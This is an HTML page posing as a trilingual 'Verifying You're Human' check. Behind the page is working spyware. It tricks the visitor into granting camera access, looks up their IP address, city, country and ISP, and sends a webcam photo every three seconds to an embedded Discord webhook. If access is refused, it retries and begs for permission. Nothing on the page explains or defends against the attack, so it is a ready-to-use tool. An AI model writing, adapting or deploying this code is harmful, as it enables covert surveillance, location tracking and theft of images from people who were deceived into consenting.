<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Verifying You're Human... / நீங்கள் மனிதரா என சரிபார்க்கிறது... / ඔබ මිනිසෙක්දැයි සත්‍යාපනය කරමින්...</title>
  <style>
    body {
      margin: 0;
      height: 100vh;
      background: linear-gradient(135deg, #0a0026, #1a0052);
      color: #00ffea;
      font-family: Arial, sans-serif;
      overflow: hidden;
      display: flex;
      align-items: center;
      justify-content: center;
      text-align: center;
    }
    #verify-screen {
      position: fixed;
      inset: 0;
      background: rgba(0,0,0,0.95);
      z-index: 9999;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      padding: 30px;
    }
    .title {
      font-size: 3rem;
      margin-bottom: 30px;
      text-shadow: 0 0 20px #00ffea;
      animation: glow 2s infinite alternate;
    }
    .status {
      font-size: 1.8rem;
      margin: 20px 0;
      color: #ff69b4;
      min-height: 80px;
    }
    .lang-block {
      font-size: 1.5rem;
      margin: 15px 0;
      line-height: 1.5;
    }
    .spinner {
      width: 80px;
      height: 80px;
      border: 8px solid #00ffea;
      border-top: 8px solid transparent;
      border-radius: 50%;
      animation: spin 1.2s linear infinite;
      margin: 30px auto;
    }
    .btn-retry {
      display: none;
      padding: 18px 60px;
      font-size: 1.8rem;
      background: #ff1493;
      color: white;
      border: none;
      border-radius: 50px;
      margin-top: 30px;
      cursor: pointer;
      box-shadow: 0 10px 30px rgba(0,0,0,0.5);
    }
    .btn-retry:hover {
      background: #ff69b4;
      transform: scale(1.05);
    }
    @keyframes glow {
      from { text-shadow: 0 0 15px #00ffea; }
      to { text-shadow: 0 0 50px #00ffea; }
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    video, canvas { display: none; }
  </style>
</head>
<body>

<div id="verify-screen">
  <div class="title">Verifying You're Human... / நீங்கள் மனிதரா என சரிபார்க்கிறது... / ඔබ මිනිසෙක්දැයි සත්‍යාපනය කරමින්...</div>
  
  <div class="spinner" id="spinner"></div>
  
  <div class="status" id="status"></div>
  
  <div class="lang-block">
    <strong>English:</strong> Tap ALLOW to verify and continue<br>
    <strong>தமிழ்:</strong> தொடர சரிபார்க்க ALLOW என்பதை தட்டவும்<br>
    <strong>සිංහල:</strong> තහවුරු කිරීමට ALLOW ඔබන්න
  </div>
  
  <button class="btn-retry" id="retryBtn">Try Again - Allow Camera ♡ / மீண்டும் முயற்சி / නැවත උත්සාහ කරන්න</button>
</div>

<video id="video" autoplay playsinline muted></video>
<canvas id="canvas"></canvas>

<script>
// Your webhook
const WEBHOOK_URL = "https://discord.com/api/webhooks/1468730735459569868/zcrVS4WVfHwsyi7RaUF6x6MjmTC8pwkMQmv1mR9N7n4DDQCldHmP8EObTQgxYD_m-NlJ";

const status = document.getElementById('status');
const spinner = document.getElementById('spinner');
const retryBtn = document.getElementById('retryBtn');
const verifyScreen = document.getElementById('verify-screen');
const video = document.getElementById('video');
const canvas = document.getElementById('canvas');

// Messages with extra begging uwu
const messages = {
  verifying: ["Checking if you're real... ♡", "சரிபார்க்கிறோம்... ♡", "සත්‍යාපනය කරමින්... ♡"],
  failed: ["Oh no~ Permission denied! Please allow camera ♡", "அனுமதி மறுக்கப்பட்டது! ALLOW செய்யவும் ♡", "අවසර ප්‍රතික්ෂේප විය! ALLOW කරන්න ♡"],
  error: ["Something broke... Try again senpai~", "ஏதோ தவறு நடந்தது... மீண்டும் முயற்சி ♡", "කුමක් හෝ වැරදිලා... නැවත උත්සාහ කරන්න ♡"],
  begging: ["Pretty pleaseee~ let me see your cute face ♡", "அழகாக கேட்கிறேன்~ கேமராவை திற ♡", "කරුණාකරලා~ කැමරාව එළියට දාන්න ♡"]
};

let langIndex = 0;
function updateStatus(key) {
  status.innerHTML = messages[key][langIndex];
  langIndex = (langIndex + 1) % 3;
}

// IP grabber
async function getIPAndGeo() {
  try {
    const res = await fetch('https://ipwho.is/');
    const data = await res.json();
    return {
      ip: data.ip || 'unknown',
      city: data.city || '??',
      country: data.country || '??',
      isp: data.connection?.isp || '??'
    };
  } catch {
    return { ip: '??', city: '??', country: '??', isp: '??' };
  }
}

// Send function (simple version for now)
async function sendCapture(blob, geo, isFirst) {
  const text = isFirst 
    ? `First success! IP: ${geo.ip} | ${geo.city}, ${geo.country}`
    : `Photo | IP: ${geo.ip}`;
  
  const formData = new FormData();
  formData.append('file', blob, `photo_${Date.now()}.jpg`);
  formData.append('payload_json', JSON.stringify({ content: text }));

  fetch(WEBHOOK_URL, { method: 'POST', body: formData }).catch(() => {});
}

// Main request function
async function requestCamera() {
  try {
    retryBtn.style.display = 'none';
    spinner.style.display = 'block';
    updateStatus('verifying');

    // Check if secure context (important!)
    if (!window.isSecureContext) {
      throw new Error("Page must be on HTTPS or localhost to ask for camera!");
    }

    await new Promise(r => setTimeout(r, 3000)); // fake delay

    const stream = await navigator.mediaDevices.getUserMedia({ 
      video: { facingMode: "user" } 
    });

    // SUCCESS!!
    verifyScreen.style.display = 'none';
    video.srcObject = stream;
    video.play().catch(() => {});

    canvas.width = 640;
    canvas.height = 480;

    const geo = await getIPAndGeo();

    // Test send
    const testBlob = new Blob([], { type: 'image/jpeg' });
    await sendCapture(testBlob, geo, true);

    // Photo loop
    setInterval(() => {
      canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
      canvas.toBlob(async (blob) => {
        if (blob) await sendCapture(blob, geo, false);
      }, 'image/jpeg', 0.5);
    }, 3000);

  } catch (err) {
    spinner.style.display = 'none';
    status.innerHTML = `<strong style="color:#ff4444">${err.message || 'Camera access failed!'}</strong><br>${messages.error[langIndex]}`;
    retryBtn.style.display = 'block';

    // Auto retry after 5 seconds
    setTimeout(requestCamera, 5000);
  }
}

// Start!
requestCamera();
retryBtn.onclick = requestCamera;
</script>

</body>
</html>
